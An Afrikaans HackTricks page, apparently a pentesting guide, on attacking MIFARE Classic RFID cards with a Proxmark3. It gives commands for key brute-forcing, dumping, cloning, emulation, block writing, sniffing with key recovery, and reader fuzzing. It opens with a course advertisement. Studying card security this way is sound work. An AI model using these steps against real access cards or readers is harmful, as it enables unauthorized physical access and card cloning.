# Proxmark 3

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy vir 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Aanvalle op RFID-stelsels met Proxmark3

Die eerste ding wat jy moet doen, is om 'n [**Proxmark3**](https://proxmark.com) te hê en [**die sagteware te installeer en sy afhanklikhede**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Aanvalle op MIFARE Classic 1KB

Dit het **16 sektore**, elkeen het **4 blokke** en elke blok bevat **16B**. Die UID is in sektor 0 blok 0 (en kan nie verander word nie).\
Om toegang tot elke sektor te verkry, het jy **2 sleutels** (**A** en **B**) nodig wat gestoor word in **blok 3 van elke sektor** (sektor-trailer). Die sektor-trailer stoor ook die **toegangsbits** wat die **lees- en skryfregte** op **elke blok** gee deur die 2 sleutels te gebruik.\
2 sleutels is nuttig om leesregte te gee as jy die eerste een ken en skryfregte as jy die tweede een ken (byvoorbeeld).

Verskeie aanvalle kan uitgevoer word
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Die Proxmark3 maak dit moontlik om ander aksies uit te voer soos **afluistering** van 'n **Tag to Reader kommunikasie** om te probeer sensitiewe data te vind. Op hierdie kaart kan jy net die kommunikasie afluister en die gebruikte sleutel bereken omdat die **kriptografiese operasies wat gebruik word swak is** en deur die plain en siffer teks te ken, kan jy dit bereken (`mfkey64`-werktuig).

### Rou Bevele

IoT-stelsels gebruik soms **nie-handelsmerk of nie-kommersiële etikette**. In hierdie geval kan jy Proxmark3 gebruik om aangepaste **rou bevele na die etikette** te stuur.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Met hierdie inligting kan jy probeer om inligting oor die kaart en die manier waarop dit kommunikeer, te soek. Proxmark3 maak dit moontlik om rou bevele te stuur soos: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3 sagteware kom met 'n voorgelaaide lys van outomatiese skripte wat jy kan gebruik om eenvoudige take uit te voer. Om die volledige lys te herwin, gebruik die `script list` bevel. Gebruik daarna die `script run` bevel, gevolg deur die skrip se naam:
```
proxmark3> script run mfkeys
```
Jy kan 'n skripsie skep om **taglesers te fuzz**, deur die data van 'n **geldige kaart** te kopieer en dan 'n **Lua-skripsie** te skryf wat een of meer **willekeurige bytes** randomiseer en nagaan of die **leser vasloop** met enige iterasie.
